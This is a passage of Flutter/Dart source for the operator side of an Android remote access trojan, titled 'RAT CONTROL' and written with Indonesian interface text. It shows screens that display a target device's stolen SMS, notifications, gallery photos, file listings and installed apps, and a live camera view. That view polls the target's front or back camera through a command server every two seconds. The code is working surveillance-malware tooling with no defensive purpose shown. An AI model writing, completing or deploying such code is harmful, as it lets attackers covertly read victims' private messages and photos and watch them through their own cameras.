                  strokeWidth: 3,
                ),
              ),
              const SizedBox(height: 18),
              const Text(
                "MENGAMBIL LOKASI...",
                style: TextStyle(
                  color: Color(0xFF1A3050),
                  fontSize: 11,
                  letterSpacing: 2.5,
                  fontFamily: 'monospace',
                ),
              ),
            ],
          ),
        ),
      ),
    );
    _locationLoadingContext = context;
  }

  void _showLocationData(Map<String, dynamic> data) {
    if (_locationLoadingContext != null) {
      Navigator.pop(_locationLoadingContext!);
      _locationLoadingContext = null;
    }
  }

  void _showInstalledAppsDialog() {
    _sendCommand('getInstalledApps');
    _addLog("📱 Mengambil daftar aplikasi...", LogType.info);
  }

  void _showInstalledAppsData(Map<String, dynamic> data) {}

  void _showGalleryDialog() {
    _openGalleryFullscreen();
  }

  void _showFileManagerDialog() {
    _sendCommand('getFiles', extra: '/storage/emulated/0');
    _addLog("📁 Mengambil file...", LogType.info);
  }

  void _showFileListData(Map<String, dynamic> data) {}

  void _showSmsData(Map<String, dynamic> data) {
    final list = data['status']?['smsList'] as List? ?? [];
    _addLog("💬 SMS data: ${list.length} aplikasi", LogType.success);
    if (list.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("Tidak ada SMS")),
      );
      return;
    }
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.92),
      builder: (context) => AlertDialog(
        backgroundColor: _cardColor,
        title: Text("📩 SMS (${list.length})", style: const TextStyle(color: Colors.white)),
        content: SizedBox(
          width: double.maxFinite,
          height: 300,
          child: ListView.builder(
            itemCount: list.length,
            itemBuilder: (context, i) {
              final app = list[i];
              final appName = app['appName'] ?? 'Unknown';
              final messages = (app['messages'] as List?) ?? [];
              return Container(
                margin: const EdgeInsets.only(bottom: 8),
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.05),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(appName, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 4),
                    ...messages.take(3).map((m) => Text(
                      m['text'] ?? '',
                      style: TextStyle(color: Colors.white70, fontSize: 12),
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    )),
                    if (messages.length > 3)
                      Text("+${messages.length - 3} lainnya", style: TextStyle(color: Colors.white38, fontSize: 10)),
                  ],
                ),
              );
            },
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("TUTUP", style: TextStyle(color: Colors.white54)),
          ),
        ],
      ),
    );
  }

  void _showNotifData(Map<String, dynamic> data) {
    final list = data['status']?['notifList'] as List? ?? [];
    _addLog("🔔 Notif data: ${list.length} aplikasi", LogType.success);
    if (list.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("Tidak ada notifikasi")),
      );
      return;
    }
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.92),
      builder: (context) => AlertDialog(
        backgroundColor: _cardColor,
        title: Text("🔔 Notifikasi (${list.length})", style: const TextStyle(color: Colors.white)),
        content: SizedBox(
          width: double.maxFinite,
          height: 300,
          child: ListView.builder(
            itemCount: list.length,
            itemBuilder: (context, i) {
              final app = list[i];
              final appName = app['appName'] ?? 'Unknown';
              final messages = (app['messages'] as List?) ?? [];
              return Container(
                margin: const EdgeInsets.only(bottom: 8),
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.05),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(appName, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 4),
                    ...messages.take(3).map((m) => Text(
                      m['text'] ?? '',
                      style: TextStyle(color: Colors.white70, fontSize: 12),
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    )),
                    if (messages.length > 3)
                      Text("+${messages.length - 3} lainnya", style: TextStyle(color: Colors.white38, fontSize: 10)),
                  ],
                ),
              );
            },
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("TUTUP", style: TextStyle(color: Colors.white54)),
          ),
        ],
      ),
    );
  }

  // ─── HELPER FUNCTIONS ──────────────────────────────────────────────
  void _copyText(String text) {
    if (text.isEmpty) return;
    Clipboard.setData(ClipboardData(text: text));
    _addLog("📋 Disalin: $text", LogType.success);
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text("✅ Disalin: $text"), duration: const Duration(seconds: 1)),
    );
  }

  // ─── DISPOSE ──────────────────────────────────────────────────────────
  @override
  void dispose() {
    _glowController.dispose();
    _rotateController.dispose();
    _logScrollController.dispose();
    _customCommandController.dispose();
    _customExtraController.dispose();
    _cameraFrameStreamController.close();
    _galleryStreamController.close();
    _pollingTimer?.cancel();
    socket.disconnect();
    socket.dispose();
    super.dispose();
  }

  // ─── BUILD MAIN ──────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _darkBg,
      appBar: PreferredSize(
        preferredSize: const Size.fromHeight(64),
        child: Container(
          decoration: BoxDecoration(
            color: _darkBg,
            border: Border(bottom: BorderSide(color: _glowColor1.withOpacity(0.3), width: 1)),
            boxShadow: [BoxShadow(color: _glowColor1.withOpacity(0.15), blurRadius: 20, offset: const Offset(0, 2))],
          ),
          child: AppBar(
            backgroundColor: Colors.transparent,
            elevation: 0,
            leading: IconButton(
              icon: Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: _glowColor1.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: _glowColor1.withOpacity(0.3)),
                ),
                child: const Icon(Icons.arrow_back_ios, color: Colors.white, size: 16),
              ),
              onPressed: () => Navigator.pop(context),
            ),
            centerTitle: true,
            title: ShaderMask(
              shaderCallback: (r) => const LinearGradient(colors: [Color(0xFF90CAF9), Colors.white, Color(0xFF42A5F5)]).createShader(r),
              child: const Text("RAT CONTROL", style: TextStyle(color: Colors.white, fontFamily: 'Orbitron', fontWeight: FontWeight.w900, fontSize: 18, letterSpacing: 3)),
            ),
            actions: [
              IconButton(
                icon: Container(
                  padding: const EdgeInsets.all(6),
                  decoration: BoxDecoration(
                    color: _accentColor.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: _accentColor.withOpacity(0.3)),
                  ),
                  child: Icon(Icons.refresh, color: _accentColor, size: 18),
                ),
                onPressed: _fetchDevices,
              ),
            ],
          ),
        ),
      ),
      body: _buildTabContent(),
      bottomNavigationBar: _buildBottomNav(),
    );
  }
}

// ─── WIDGET GALLERY FULLSCREEN ──────────────────────────────────────
class GalleryFullscreenPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final Stream<List<Map<String, dynamic>>> galleryStream;
  final VoidCallback onClose;
  final VoidCallback onRefresh;
  final Function(String) onDownload;

  const GalleryFullscreenPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.galleryStream,
    required this.onClose,
    required this.onRefresh,
    required this.onDownload,
  }) : super(key: key);

  @override
  State<GalleryFullscreenPage> createState() => _GalleryFullscreenPageState();
}

class _GalleryFullscreenPageState extends State<GalleryFullscreenPage> {
  List<Map<String, dynamic>> _photos = [];
  bool _isLoading = true;
  String _currentImage = '';
  int _currentIndex = 0;
  bool _showImageViewer = false;
  double _scale = 1.0;
  double _offsetX = 0.0;
  double _offsetY = 0.0;

  @override
  void initState() {
    super.initState();
    widget.galleryStream.listen((photos) {
      if (mounted) {
        setState(() {
          _photos = photos;
          _isLoading = false;
        });
      }
    });
  }

  void _openImageViewer(int index) {
    if (_photos.isEmpty || index >= _photos.length) return;
    setState(() {
      _currentIndex = index;
      _currentImage = _photos[index]['thumb'] ?? '';
      _showImageViewer = true;
      _scale = 1.0;
      _offsetX = 0.0;
      _offsetY = 0.0;
    });
  }

  void _closeImageViewer() {
    setState(() {
      _showImageViewer = false;
      _currentImage = '';
      _scale = 1.0;
      _offsetX = 0.0;
      _offsetY = 0.0;
    });
  }

  void _nextImage() {
    if (_currentIndex < _photos.length - 1) {
      setState(() {
        _currentIndex++;
        _currentImage = _photos[_currentIndex]['thumb'] ?? '';
        _scale = 1.0;
        _offsetX = 0.0;
        _offsetY = 0.0;
      });
    }
  }

  void _prevImage() {
    if (_currentIndex > 0) {
      setState(() {
        _currentIndex--;
        _currentImage = _photos[_currentIndex]['thumb'] ?? '';
        _scale = 1.0;
        _offsetX = 0.0;
        _offsetY = 0.0;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            if (_isLoading)
              const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(width: 50, height: 50, child: CircularProgressIndicator(color: Colors.white54, strokeWidth: 3)),
                    SizedBox(height: 20),
                    Text("LOADING GALLERY...", style: TextStyle(color: Colors.white54, fontSize: 13, letterSpacing: 3)),
                  ],
                ),
              )
            else if (_photos.isEmpty)
              const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.photo_library_outlined, color: Colors.white24, size: 64),
                    SizedBox(height: 16),
                    Text("Tidak ada foto", style: TextStyle(color: Colors.white38, fontSize: 14, letterSpacing: 1)),
                  ],
                ),
              )
            else
              GridView.builder(
                padding: const EdgeInsets.all(8),
                gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                  crossAxisCount: 3,
                  crossAxisSpacing: 6,
                  mainAxisSpacing: 6,
                  childAspectRatio: 1,
                ),
                itemCount: _photos.length > 40 ? 40 : _photos.length,
                itemBuilder: (context, index) {
                  final photo = _photos[index];
                  final thumb = photo['thumb'] ?? '';
                  return GestureDetector(
                    onTap: () => _openImageViewer(index),
                    child: Container(
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(10),
                        color: Colors.white.withOpacity(0.05),
                        border: Border.all(color: Colors.white.withOpacity(0.06)),
                      ),
                      child: ClipRRect(
                        borderRadius: BorderRadius.circular(10),
                        child: thumb.isNotEmpty
                            ? Image.memory(
                          base64Decode(thumb.contains(',') ? thumb.split(',').last : thumb),
                          fit: BoxFit.cover,
                          errorBuilder: (context, error, stackTrace) {
                            return Container(
                              color: Colors.white10,
                              child: const Icon(Icons.broken_image, color: Colors.white24, size: 30),
                            );
                          },
                        )
                            : Container(
                          color: Colors.white10,
                          child: const Icon(Icons.image_not_supported, color: Colors.white24, size: 30),
                        ),
                      ),
                    ),
                  );
                },
              ),

            // HUD
            Positioned(
              top: 0, left: 0, right: 0,
              child: Container(
                padding: const EdgeInsets.fromLTRB(20, 20, 20, 12),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.7), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(width: 10, height: 10, decoration: const BoxDecoration(color: Colors.pink, shape: BoxShape.circle)),
                        const SizedBox(width: 10),
                        const Text("GALLERY", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 2)),
                        const SizedBox(width: 12),
                        Text("${_photos.length > 40 ? '40' : _photos.length} / ${_photos.length}", style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 10, letterSpacing: 1)),
                      ],
                    ),
                    Text(widget.targetModel, style: const TextStyle(color: Color(0x66FFFFFF), fontSize: 10, letterSpacing: 1)),
                  ],
                ),
              ),
            ),

            Positioned(
              top: 20, right: 20,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.05),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(Icons.close, color: Colors.white, size: 20),
                ),
              ),
            ),

            Positioned(
              top: 20, left: 120,
              child: GestureDetector(
                onTap: () {
                  setState(() => _isLoading = true);
                  widget.onRefresh();
                  Future.delayed(const Duration(seconds: 3), () {
                    if (mounted) setState(() => _isLoading = false);
                  });
                },
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.05),
                    borderRadius: BorderRadius.circular(20),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Row(
                    children: [
                      Icon(Icons.refresh, color: Colors.white54, size: 16),
                      SizedBox(width: 4),
                      Text("REFRESH", style: TextStyle(color: Colors.white54, fontSize: 10, letterSpacing: 1)),
                    ],
                  ),
                ),
              ),
            ),

            if (_showImageViewer && _currentImage.isNotEmpty)
              Container(
                color: Colors.black.withOpacity(0.95),
                child: Stack(
                  children: [
                    Center(
                      child: GestureDetector(
                        onScaleStart: (details) {
                          setState(() { _offsetX = 0; _offsetY = 0; _scale = 1.0; });
                        },
                        onScaleUpdate: (details) {
                          setState(() {
                            _scale = (_scale * details.scale).clamp(0.5, 4.0);
                            _offsetX += details.focalPointDelta.dx;
                            _offsetY += details.focalPointDelta.dy;
                          });
                        },
                        child: Transform(
                          transform: Matrix4.identity()..translate(_offsetX, _offsetY)..scale(_scale),
                          child: Image.memory(
                            base64Decode(_currentImage.contains(',') ? _currentImage.split(',').last : _currentImage),
                            fit: BoxFit.contain,
                            width: MediaQuery.of(context).size.width * 0.95,
                            height: MediaQuery.of(context).size.height * 0.75,
                            errorBuilder: (context, error, stackTrace) {
                              return const Center(child: Text("Error loading image", style: TextStyle(color: Colors.white38)));
                            },
                          ),
                        ),
                      ),
                    ),
                    Positioned(
                      top: 20, right: 20,
                      child: GestureDetector(
                        onTap: _closeImageViewer,
                        child: Container(
                          width: 40, height: 40,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            color: Colors.white.withOpacity(0.05),
                            border: Border.all(color: Colors.white.withOpacity(0.1)),
                          ),
                          child: const Icon(Icons.close, color: Colors.white, size: 20),
                        ),
                      ),
                    ),
                    if (_photos.length > 1) ...[
                      Positioned(
                        left: 10, top: 0, bottom: 0,
                        child: Center(
                          child: GestureDetector(
                            onTap: _prevImage,
                            child: Container(
                              padding: const EdgeInsets.all(8),
                              decoration: BoxDecoration(
                                shape: BoxShape.circle,
                                color: Colors.white.withOpacity(0.05),
                                border: Border.all(color: Colors.white.withOpacity(0.1)),
                              ),
                              child: const Icon(Icons.chevron_left, color: Colors.white, size: 30),
                            ),
                          ),
                        ),
                      ),
                      Positioned(
                        right: 10, top: 0, bottom: 0,
                        child: Center(
                          child: GestureDetector(
                            onTap: _nextImage,
                            child: Container(
                              padding: const EdgeInsets.all(8),
                              decoration: BoxDecoration(
                                shape: BoxShape.circle,
                                color: Colors.white.withOpacity(0.05),
                                border: Border.all(color: Colors.white.withOpacity(0.1)),
                              ),
                              child: const Icon(Icons.chevron_right, color: Colors.white, size: 30),
                            ),
                          ),
                        ),
                      ),
                    ],
                    Positioned(
                      bottom: 80, left: 0, right: 0,
                      child: Center(
                        child: Container(
                          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
                          decoration: BoxDecoration(
                            color: Colors.white.withOpacity(0.1),
                            borderRadius: BorderRadius.circular(20),
                          ),
                          child: Text(
                            "${_currentIndex + 1} / ${_photos.length > 40 ? 40 : _photos.length}",
                            style: const TextStyle(color: Colors.white54, fontSize: 12, letterSpacing: 1),
                          ),
                        ),
                      ),
                    ),
                    Positioned(
                      bottom: 20, left: 0, right: 0,
                      child: Center(
                        child: ElevatedButton.icon(
                          onPressed: () {
                            widget.onDownload(_currentImage);
                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(content: Text("📥 Downloading..."), duration: Duration(seconds: 1)),
                            );
                          },
                          icon: const Icon(Icons.download, size: 18),
                          label: const Text("DOWNLOAD"),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.pink.withOpacity(0.2),
                            foregroundColor: Colors.white,
                            padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(25),
                              side: BorderSide(color: Colors.pink.withOpacity(0.2)),
                            ),
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
          ],
        ),
      ),
    );
  }
}

// ─── WIDGET LIVE CAMERA ──────────────────────────────────────────────
class LiveCameraPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final String facing;
  final VoidCallback onClose;
  final Stream<String> frameStream;
  final bool isLoading;
  final Function(String) onSwitchCamera;
  final VoidCallback onCapture;

  const LiveCameraPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.facing,
    required this.onClose,
    required this.frameStream,
    required this.isLoading,
    required this.onSwitchCamera,
    required this.onCapture,
  }) : super(key: key);

  @override
  State<LiveCameraPage> createState() => _LiveCameraPageState();
}

class _LiveCameraPageState extends State<LiveCameraPage> {
  String _currentFrame = '';
  bool _isLoading = true;

  @override
  void initState() {
    super.initState();
    _isLoading = widget.isLoading;
    widget.frameStream.listen((frame) {
      if (mounted) {
        setState(() {
          _currentFrame = frame;
          _isLoading = false;
        });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            if (_currentFrame.isNotEmpty)
              Center(
                child: RepaintBoundary(
                  child: InteractiveViewer(
                    minScale: 0.5, maxScale: 3.0,
                    child: Image.memory(
                      base64Decode(_currentFrame.split(',').last),
                      fit: BoxFit.contain,
                      width: double.infinity,
                      height: double.infinity,
                      errorBuilder: (context, error, stackTrace) {
                        return const Center(child: Text("Error loading camera", style: TextStyle(color: Colors.white54)));
                      },
                    ),
                  ),
                ),
              )
            else
              const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(width: 50, height: 50, child: CircularProgressIndicator(color: Colors.white54, strokeWidth: 3)),
                    SizedBox(height: 20),
                    Text("CONNECTING CAMERA...", style: TextStyle(color: Colors.white54, fontSize: 13, letterSpacing: 3)),
                  ],
                ),
              ),

            // HUD
            Positioned(
              top: 0, left: 0, right: 0,
              child: Container(
                padding: const EdgeInsets.fromLTRB(20, 20, 20, 20),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter, end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.7), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(width: 10, height: 10, decoration: const BoxDecoration(color: Colors.red, shape: BoxShape.circle)),
                        const SizedBox(width: 10),
                        const Text("LIVE", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 2)),
                        const SizedBox(width: 16),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                          decoration: BoxDecoration(color: Colors.white.withOpacity(0.1), borderRadius: BorderRadius.circular(4)),
                          child: Text(widget.facing.toUpperCase(), style: const TextStyle(color: Color(0x99FFFFFF), fontSize: 10, letterSpacing: 1)),
                        ),
                      ],
                    ),
                    Text(widget.targetModel, style: const TextStyle(color: Color(0x66FFFFFF), fontSize: 10, letterSpacing: 1)),
                  ],
                ),
              ),
            ),

            Positioned(
              top: 20, right: 20,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 40, height: 40,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.05),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(Icons.close, color: Colors.white, size: 20),
                ),
              ),
            ),

            Positioned(
              bottom: 55, left: 30,
              child: GestureDetector(
                onTap: () {
                  final newFacing = widget.facing == 'front' ? 'back' : 'front';
                  widget.onSwitchCamera(newFacing);
                },
                child: Container(
                  width: 44, height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.05),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(Icons.switch_camera, color: Color(0x99FFFFFF), size: 22),
                ),
              ),
            ),

            Positioned(
              bottom: 55, right: 30,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 44, height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.red.withOpacity(0.1),
                    border: Border.all(color: Colors.red.withOpacity(0.2)),
                  ),
                  child: const Icon(Icons.stop, color: Color(0x99FF0000), size: 22),
                ),
              ),
            ),

            Positioned(
              bottom: 50, left: 0, right: 0,
              child: Center(
                child: GestureDetector(
                  onTap: widget.onCapture,
                  child: Container(
                    width: 60, height: 60,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: Colors.white.withOpacity(0.05),
                      border: Border.all(color: Colors.white.withOpacity(0.15), width: 2),
                    ),
                    child: const Icon(Icons.camera_alt, color: Colors.white, size: 28),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ─── WIDGET LIVE CAMERA POLLING (REST) ──────────────────────────────
class LiveCameraPollingPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final String facing;
  final VoidCallback onClose;
  final Function(String) onSwitchCamera;

  const LiveCameraPollingPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.facing,
    required this.onClose,
    required this.onSwitchCamera,
  }) : super(key: key);

  @override
  State<LiveCameraPollingPage> createState() => _LiveCameraPollingPageState();
}

class _LiveCameraPollingPageState extends State<LiveCameraPollingPage> {
  String _currentFrame = '';
  bool _isLoading = true;
  Timer? _pollingTimer;
  String _currentFacing = '';

  @override
  void initState() {
    super.initState();
    _currentFacing = widget.facing;
    _fetchFrame();
    
    _pollingTimer = Timer.periodic(const Duration(seconds: 2), (timer) {
      _fetchFrame();
    });
  }

  Future<void> _fetchFrame() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';
      
      final response = await http.get(
        Uri.parse("$baseUrl/api/live-camera/${widget.targetId}?facing=$_currentFacing"),
        headers: {"x-auth-token": token},
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['frame'] != null && data['frame'].isNotEmpty) {
          if (mounted) {
            setState(() {
              _currentFrame = data['frame'];
              _isLoading = false;
            });
          }
        }
      }
    } catch (e) {
      // Silent fail
    }
  }

  @override
  void dispose() {
    _pollingTimer?.cancel();
    widget.onClose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            if (_currentFrame.isNotEmpty)
              Center(
                child: RepaintBoundary(
                  child: InteractiveViewer(
                    minScale: 0.5,
                    maxScale: 3.0,
                    child: Image.memory(
                      base64Decode(_currentFrame.split(',').last),
                      fit: BoxFit.contain,
                      width: double.infinity,
                      height: double.infinity,
                      errorBuilder: (context, error, stackTrace) {
                        return const Center(
                          child: Text(
                            "Error loading camera",
                            style: TextStyle(color: Colors.white54),
                          ),
                        );
                      },
                    ),
                  ),
                ),
              )
            else
              const Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(
                      width: 50,
                      height: 50,
                      child: CircularProgressIndicator(
                        color: Colors.white54,
                        strokeWidth: 3,
                      ),
                    ),
                    SizedBox(height: 20),
                    Text(
                      "CONNECTING CAMERA...",
                      style: TextStyle(
                        color: Colors.white54,
                        fontSize: 13,
                        letterSpacing: 3,
                      ),
                    ),
                  ],
                ),
              ),

            Positioned(
              top: 0,
              left: 0,
              right: 0,
              child: Container(
                padding: const EdgeInsets.fromLTRB(20, 20, 20, 20),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.7), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(
                          width: 10,
                          height: 10,
                          decoration: const BoxDecoration(
                            color: Colors.red,
                            shape: BoxShape.circle,
                          ),
                        ),
                        const SizedBox(width: 10),
                        const Text(
                          "LIVE",
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 14,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 2,
                          ),
                        ),
                        const SizedBox(width: 16),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                          decoration: BoxDecoration(
                            color: Colors.white.withOpacity(0.1),
                            borderRadius: BorderRadius.circular(4),
                          ),
                          child: Text(
                            _currentFacing.toUpperCase(),
                            style: const TextStyle(
                              color: Color(0x99FFFFFF),
                              fontSize: 10,
                              letterSpacing: 1,
                            ),
                          ),
                        ),
                      ],
                    ),
                    Text(
                      widget.targetModel,
                      style: const TextStyle(
                        color: Color(0x66FFFFFF),
                        fontSize: 10,
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
              ),
            ),

            Positioned(
              top: 20,
              right: 20,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 40,
                  height: 40,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.05),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(
                    Icons.close,
                    color: Colors.white,
                    size: 20,
                  ),
                ),
              ),
            ),

            Positioned(
              bottom: 55,
              left: 30,
              child: GestureDetector(
                onTap: () {
                  final newFacing = _currentFacing == 'front' ? 'back' : 'front';
                  setState(() {
                    _currentFacing = newFacing;
                    _isLoading = true;
                    _currentFrame = '';
                  });
                  widget.onSwitchCamera(newFacing);
                  _fetchFrame();
                },
                child: Container(
                  width: 44,
                  height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.white.withOpacity(0.05),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(
                    Icons.switch_camera,
                    color: Color(0x99FFFFFF),
                    size: 22,
                  ),
                ),
              ),
            ),

            Positioned(
              bottom: 55,
              right: 30,
              child: GestureDetector(
                onTap: widget.onClose,
                child: Container(
                  width: 44,
                  height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.red.withOpacity(0.1),
                    border: Border.all(color: Colors.red.withOpacity(0.2)),
                  ),
                  child: const Icon(
                    Icons.stop,
                    color: Color(0x99FF0000),
                    size: 22,
                  ),
                ),
              ),
            ),

            Positioned(
              bottom: 50,
              left: 0,
              right: 0,
              child: Center(
                child: GestureDetector(
                  onTap: () {
                    _sendCommand('camera', extra: _currentFacing);
                  },
                  child: Container(
                    width: 60,
                    height: 60,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: Colors.white.withOpacity(0.05),
                      border: Border.all(color: Colors.white.withOpacity(0.15), width: 2),
                    ),
                    child: const Icon(
                      Icons.camera_alt,
                      color: Colors.white,
                      size: 28,
                    ),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _sendCommand(String command, {String? extra}) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';
      await http.post(
        Uri.parse("$baseUrl/api/command/${widget.targetId}"),
        headers: {"Content-Type": "application/json", "x-auth-token": token},
        body: jsonEncode({"command": command, "value": extra ?? ""}),
      );
    } catch (_) {}
  }
}

// ─── WIDGET SCREENSHOT RESULT ────────────────────────────────────────
class ScreenshotResultPage extends StatelessWidget {
  final String targetModel;
  final String screenshotFrame;
  final String screenshotFacing;
  final VoidCallback onClose;

  const ScreenshotResultPage({
    Key? key,
    required this.targetModel,
    required this.screenshotFrame,
    required this.screenshotFacing,
    required this.onClose,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black.withOpacity(0.95),
      body: SafeArea(
        child: Stack(
          children: [
            Center(
              child: InteractiveViewer(
                minScale: 0.5,
                maxScale: 3.0,
                child: Image.memory(
                  base64Decode(screenshotFrame.split(',').last),
                  fit: BoxFit.contain,
                  width: MediaQuery.of(context).size.width * 0.9,
                  height: MediaQuery.of(context).size.height * 0.7,
                  errorBuilder: (context, error, stackTrace) {
                    return const Center(
                      child: Text(
                        "Gagal load gambar",
                        style: TextStyle(color: Colors.white54),
                      ),
                    );
                  },
                ),
              ),
            ),
            Positioned(
              top: 0,
              left: 0,
              right: 0,
              child: Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.75), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(
                          width: 8,
                          height: 8,
                          decoration: const BoxDecoration(
                            color: Colors.red,
                            shape: BoxShape.circle,
                          ),
                        ),
                        const SizedBox(width: 8),
                        Text(
                          "KAMERA ${screenshotFacing.toUpperCase()}",
                          style: const TextStyle(
                            color: Colors.white,
                            fontSize: 12,
                            letterSpacing: 2,
                          ),
                        ),
                        const SizedBox(width: 12),
                        Text(
                          targetModel,
                          style: TextStyle(
                            color: Colors.white.withOpacity(0.4),
                            fontSize: 9,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    ),
                    Text(
                      DateTime.now().toLocal().toString().substring(11, 19),
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.4),
                        fontSize: 9,
                        letterSpacing: 1,
                      ),
                    ),
                  ],
                ),
